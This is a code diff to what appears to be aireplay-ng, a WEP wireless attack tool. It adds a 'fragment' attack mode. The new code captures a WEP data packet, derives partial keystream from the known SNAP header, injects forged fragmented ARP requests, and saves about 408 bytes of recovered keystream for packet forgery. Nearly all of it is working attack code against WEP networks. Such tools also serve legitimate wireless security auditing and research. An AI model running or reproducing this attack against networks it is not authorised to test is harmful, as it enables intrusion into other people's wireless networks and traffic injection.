@@ -62,6 +62,9 @@
 #define ETH_P_80211_RAW 25
 #endif
 
+#define NEW_IV  1
+#define RETRY   2
+
 #define DEAUTH_REQ      \
     "\xC0\x00\x3A\x01\xCC\xCC\xCC\xCC\xCC\xCC\xBB\xBB\xBB\xBB\xBB\xBB" \
     "\xBB\xBB\xBB\xBB\xBB\xBB\x00\x00\x07\x00"
@@ -143,6 +146,7 @@ char usage[] =
 "      --interactive       : interactive frame selection (-2)\n"
 "      --arpreplay         : standard ARP-request replay (-3)\n"
 "      --chopchop          : decrypt/chopchop WEP packet (-4)\n"
+"      --fragment          : generates valid keystream   (-5)\n"
 "\n";
 
 struct options
@@ -163,6 +167,8 @@ struct options
     unsigned char r_bssid[6];
     unsigned char r_dmac[6];
     unsigned char r_smac[6];
+    unsigned char r_dip[4];
+    unsigned char r_sip[4];
     char r_essid[33];
     int r_fromdsinj;
 
@@ -2164,6 +2170,399 @@ int do_attack_chopchop( void )
     return( 0 );
 }
 
+int make_arp_request(uchar *h80211, uchar *bssid, uchar *src_mac, uchar *dst_mac, uchar *src_ip, uchar *dst_ip, int size)
+{
+    // 802.11 part
+    uchar *header80211 = "\x08\x41\x95\x00";
+    memcpy(h80211,    header80211, 4);
+    memcpy(h80211+4,  bssid,       6);
+    memcpy(h80211+10, src_mac,     6);
+    memcpy(h80211+16, dst_mac,     6);
+    h80211[22] = '\x00';
+    h80211[23] = '\x00';
+
+    // ARP part
+    uchar *arp_header = "\xaa\xaa\x03\x00\x00\x00\x08\x06\x00\x01\x08\x00\x06\x04\x00\x01";
+    memcpy(h80211+24, arp_header, 16);
+    memcpy(h80211+40, src_mac,     6);
+    memcpy(h80211+46, src_ip,      4);
+    memset(h80211+50, '\x00',      6);
+    memcpy(h80211+56, dst_ip,      4);
+
+    // Insert padding bytes
+    memset(h80211+60, '\x00', size-60);
+
+    return 0;
+}
+
+void add_icv(uchar *input, int len)
+{
+    unsigned long crc = 0xFFFFFFFF;
+    int n=0;
+
+    for( n = 28; n < len; n++ )
+        crc = crc_tbl[(crc ^ input[n]) & 0xFF] ^ (crc >> 8);
+
+    crc = ~crc;
+
+    input[len]   = (crc      ) & 0xFF;
+    input[len+1] = (crc >>  8) & 0xFF;
+    input[len+2] = (crc >> 16) & 0xFF;
+    input[len+3] = (crc >> 24) & 0xFF;
+
+    return;
+}
+
+int xor_keystream(uchar *ph80211, uchar *keystream, int len)
+{
+    int i=0;
+
+    for (i=0; i<len; i++) {
+        ph80211[i] = ph80211[i] ^ keystream[i];
+    }
+
+    return 0;
+}
+
+void send_fragments(uchar *packet, int packet_len, uchar *iv, uchar *keystream, int fragsize)
+{
+    int t, u;
+    int data_size = packet_len - 24;
+    uchar frag[30+fragsize];
+    int pack_size;
+
+    for (t=0; t+=fragsize;)
+    {
+
+    //Copy header
+        memcpy(frag, packet, 24);
+
+    //Copy IV + KeyIndex
+        memcpy(frag+24, iv, 4);
+
+    //Copy data
+        memcpy(frag+28, packet+24+t-fragsize, fragsize);
+
+    //Make ToDS frame
+        frag[1] |= 1;
+        frag[1] &= 253;
+
+    //Set fragment bit
+        if (t< data_size) frag[1] |= 4;
+        if (t==data_size) frag[1] &= 251;
+
+    //Fragment number
+        frag[22] = 0;
+        for (u=t; u-=fragsize;)
+        {
+            frag[22] += 1;
+        }
+        frag[23] = 0;
+
+    //Calculate packet lenght
+        pack_size = 28 + fragsize;
+
+    //Add ICV
+        add_icv(frag, pack_size);
+        pack_size += 4;
+
+    //Encrypt
+        xor_keystream(frag+28, keystream, fragsize+4);
+
+    //Send
+        send_packet(frag, pack_size);
+        usleep(10);
+
+        if (t>=data_size) break;
+    }
+
+}
+
+void save_prga(char *filename, uchar *iv, uchar *prga, int prgalen)
+{
+    FILE *xorfile;
+    xorfile = fopen(filename, "wb");
+    fwrite (iv, 1, 4, xorfile);
+    fwrite (prga, 1, prgalen, xorfile);
+    fclose (xorfile);
+}
+
+int do_attack_fragment()
+{
+    uchar packet[4096];
+    uchar prga[4096];
+    uchar strbuf[256];
+    uchar *snap_header = "\xAA\xAA\x03\x00\x00\x00\x08";
+    uchar iv[4];
+    uchar ack[14] = "\xd4";
+    struct tm *lt;
+
+
+    int done = 0, caplen = 0, arplen = 0, round = 0, prga_len = 0, isrelay = 0, gotit = 0, again = 0;
+    struct timeval tv, tv2;
+
+
+    if( memcmp( opt.f_bssid, NULL_MAC, 6 ) == 0 )
+    {
+        printf( "Please specify a BSSID (-b).\n" );
+        return( 1 );
+    }
+
+    if( memcmp( opt.r_smac, NULL_MAC, 6 ) == 0 )
+    {
+        printf( "Please specify a source MAC (-h).\n" );
+        return( 1 );
+    }
+
+    if( memcmp( opt.r_sip, NULL_MAC, 4 ) == 0 )
+    {
+        printf( "Please specify a source IP (-k).\n" );
+        return( 1 );
+    }
+
+    if( memcmp( opt.r_dmac, NULL_MAC, 6 ) == 0 )
+    {
+        memset( opt.r_dmac, '\xFF', 6);
+    }
+
+    if( memcmp( opt.r_dip, NULL_MAC, 4 ) == 0 )
+    {
+        memset( opt.r_dip, '\xFF', 4);
+    }
+
+    printf ("Waiting for a data packet...\n");
+
+    while(!done)  //
+    {
+        round = 0;
+        while(1)  //waiting for data packet
+        {
+            caplen = read_packet(packet, 4096);
+            if (packet[0] == '\x08' && 
+                memcmp(packet+10, opt.f_bssid, 6) == 0 &&
+                (packet[1] & 64) == 64 )
+                break;
+        }
+
+        printf("Data packet found!\n");
+
+        prga_len = 7;
+
+        again = RETRY;
+
+        while(again == RETRY)  //sending 7byte fragments
+        {
+            again = 0;
+            memcpy(prga, packet+28, prga_len);
+            memcpy(iv, packet+24, 4);
+
+            xor_keystream(prga, snap_header, prga_len);
+            make_arp_request(h80211, opt.f_bssid, opt.r_smac, opt.r_dmac, opt.r_sip, opt.r_dip, 60);
+            arplen=60;
+            if ((round % 2) == 1)
+            {
+                printf("Trying a LLC NULL packet\n");
+                memset(h80211+24, '\x00', 39);
+                arplen=63;
+            }
+
+            printf("Sending fragmented packet\n");
+            send_fragments(h80211, arplen, iv, prga, 3);
+            //Plus an ACK
+            send_packet(ack, 10);
+
+            gettimeofday( &tv, NULL );
+
+
+            while (!gotit)  //waiting for relayed packet
+            {
+                caplen = read_packet(packet, 4096);
+
+                if (packet[0] == '\x08') //Is data frame
+                {
+                    if (packet[1] & 2)  //Is a FromDS packet
+                    {
+                        if (! memcmp(opt.r_dmac, packet+4, 6)) //To our MAC
+                        {
+                            if (! memcmp(opt.r_smac, packet+16, 6)) //From our MAC
+                            {
+                                if (caplen < 90)  //Is short enough
+                                {
+                                    //This is our relayed packet!
+                                    printf("Got RELAYED packet!!\n");
+                                    gotit = 1;
+                                    isrelay = 1;
+                                }
+                            }
+                        }
+
+                        if (! memcmp(opt.r_smac, packet+4, 6)) //To our MAC
+                        {
+                            if (caplen < 90) //Is short enough
+                            {
+                                //This is an answer to our packet!
+                                printf("Got ANSWER packet!!\n");
+                                gotit = 1;
+                                isrelay = 0;
+                            }
+                        }
+                    }
+                }
+                gettimeofday( &tv2, NULL );
+                if (((tv2.tv_sec*1000000 - tv.tv_sec*1000000) + (tv2.tv_usec - tv.tv_usec)) > (500*1000) && !gotit) //wait 500ms for an answer
+                {
+                    printf("No answer, repeating...\n");
+                    round++;
+                    again = RETRY;
+                    if (round > 10)
+                    {
+                        printf("Still nothing, trying another packet...\n");
+                        again = NEW_IV;
+                    }
+                    break;
+                }
+            }
+        }
+
+        if(again == NEW_IV) continue;
+
+            make_arp_request(h80211, opt.f_bssid, opt.r_smac, opt.r_dmac, opt.r_sip, opt.r_dip, 60);
+        if (caplen == 68)
+        {
+            //Thats the ARP packet!
+            printf("Thats our ARP packet!\n");
+        }
+        if (caplen == 71)
+        {
+            //Thats the LLC NULL packet!
+            printf("Thats our LLC Null packet!\n");
+            memset(h80211+24, '\x00', 39);
+        }
+
+        if (! isrelay)
+        {
+            //Building expected cleartext
+            uchar ct[4096] = "\xaa\xaa\x03\x00\x00\x00\x08\x06\x00\x01\x08\x00\x06\x04\x00\x02";
+            //Ethernet & ARP header
+
+            //Followed by the senders MAC and IP:
+            memcpy(ct+16, packet+16, 6);
+            memcpy(ct+22, opt.r_dip,  4);
+
+            //And our own MAC and IP:
+            memcpy(ct+26, opt.r_smac,   6);
+            memcpy(ct+32, opt.r_sip,   4);
+
+            //Calculating
+            memcpy(prga, packet+28, 36);
+            xor_keystream(prga, ct, 36);
+        }
+        else
+        {
+            memcpy(prga, packet+28, 36);
+            xor_keystream(prga, h80211+24, 36);
+        }
+
+        round = 0;
+        again = RETRY;
+        while(again == RETRY)
+        {
+            again = 0;
+
+            memcpy(iv, packet+24, 4);
+            printf("Trying to get 408 bytes of a keystream\n");
+
+            make_arp_request(h80211, opt.f_bssid, opt.r_smac, opt.r_dmac, opt.r_sip, opt.r_dip, 408);
+            arplen=408;
+            if ((round % 2) == 1)
+            {
+                printf("Trying a LLC NULL packet\n");
+                memset(h80211+24, '\x00', 416);
+                arplen+=32;
+            }
+
+            send_fragments(h80211, arplen, iv, prga, 32);
+            //Plus an ACK
+            send_packet(ack, 10);
+
+            gettimeofday( &tv, NULL );
+
+            gotit=0;
+            while (!gotit)  //waiting for relayed packet
+            {
+                caplen = read_packet(packet, 4096);
+
+                if (packet[0] == '\x08') //Is data frame
+                {
+                    if (packet[1] & 2)  //Is a FromDS packet
+                    {
+                        if (! memcmp(opt.r_dmac, packet+4, 6)) //To our MAC
+                        {
+                            if (! memcmp(opt.r_smac, packet+16, 6)) //From our MAC
+                            {
+                                if (caplen > 400)  //Is short enough
+                                {
+                                    //This is our relayed packet!
+                                    printf("Got RELAYED packet!!\n");
+                                    gotit = 1;
+                                    isrelay = 1;
+                                }
+                            }
+                        }
+                    }
+                }
+                gettimeofday( &tv2, NULL );
+                if (((tv2.tv_sec*1000000 - tv.tv_sec*1000000) + (tv2.tv_usec - tv.tv_usec)) > (500*1000) && !gotit) //wait 500ms for an answer
+                {
+                    printf("No answer, repeating...\n");
+                    round++;
+                    again = RETRY;
+                    if (round > 10)
+                    {
+                        printf("Still nothing, trying another packet...\n");
+                        again = NEW_IV;
+                    }
+                    break;
+                }
+            }
+        }
+
+        if(again == NEW_IV) continue;
+
+        make_arp_request(h80211, opt.f_bssid, opt.r_smac, opt.r_dmac, opt.r_sip, opt.r_dip, 408);
+        if (caplen == 416)
+        {
+            //Thats the ARP packet!
+            printf("Thats our ARP packet!\n");
+        }
+        if (caplen == 448)
+        {
+            //Thats the LLC NULL packet!
+            printf("Thats our LLC Null packet!\n");
+            memset(h80211+24, '\x00', 416);
+        }
+
+        memcpy(iv, packet+24, 4);
+        memcpy(prga, packet+28, 408);
+        xor_keystream(prga, h80211+24, 408);
+
+        lt = localtime(&tv.tv_sec);
+        memset( strbuf, 0, sizeof( strbuf ) );
+        snprintf( strbuf,  sizeof( strbuf ) - 1,
+                  "fragment-%02d%02d-%02d%02d%02d.xor",
+                  lt->tm_mon + 1, lt->tm_mday,
+                  lt->tm_hour, lt->tm_min, lt->tm_sec );
+        save_prga(strbuf, iv, prga, 432);
+
+        printf("Now you can build a packet with packetforge-ng out of that keystream\n");
+
+        done=1;
+
+    }
+
+    return( 0 );
+}
+
 
 int sysfs_inject=0;
 int opensysfs( char *iface, int fd) {
@@ -2295,11 +2694,12 @@ int main( int argc, char *argv[] )
             {"interactive", 0, 0, '2'},
             {"arpreplay",   0, 0, '3'},
             {"chopchop",    0, 0, '4'},
+            {"fragment",    0, 0, '5'},
             {0,             0, 0,  0 }
         };
 
         int option = getopt_long( argc, argv,
-                        "b:d:s:m:n:u:v:t:f:g:w:x:p:a:c:h:e:j:i:r:0:1:234",
+                        "b:d:s:m:n:u:v:t:f:g:w:x:p:a:c:h:e:j:i:r:k:l:0:1:2345",
                         long_options, &option_index );
 
         if( option < 0 ) break;
@@ -2445,15 +2845,15 @@ int main( int argc, char *argv[] )
                 }
                 break;
 
-			case 'g' :
+            case 'g' :
 
                 if( sscanf( optarg, "%d", &opt.ringbuffer ) != 1 ||
                     opt.ringbuffer < 1 )
-				{
-					printf( "Invalid replay ring buffer size.\n");
-					return( 1 );
-				}
-				break;
+                {
+                    printf( "Invalid replay ring buffer size.\n");
+                    return( 1 );
+                }
+                break;
 
             case 'h' :
 
@@ -2473,6 +2873,16 @@ int main( int argc, char *argv[] )
             case 'j' :
 
                 opt.r_fromdsinj = 1;
+                break;
+
+            case 'k' :
+
+                inet_aton( optarg, (struct in_addr *) opt.r_sip );
+                break;
+
+            case 'l' :
+
+                inet_aton( optarg, (struct in_addr *) opt.r_dip );
                 break;
 
             case 'i' :
@@ -2563,6 +2973,16 @@ int main( int argc, char *argv[] )
                     return( 1 );
                 }
                 opt.a_mode = 4;
+                break;
+
+            case '5' :
+
+                if( opt.a_mode != -1 )
+                {
+                    printf( "Attack mode already specified.\n" );
+                    return( 1 );
+                }
+                opt.a_mode = 5;
                 break;
 
             default : goto usage;
@@ -2826,6 +3246,7 @@ int main( int argc, char *argv[] )
         case 2 : return( do_attack_interactive() );
         case 3 : return( do_attack_arp_resend()  );
         case 4 : return( do_attack_chopchop()    );
+        case 5 : return( do_attack_fragment()    );
         default: break;
     }
 
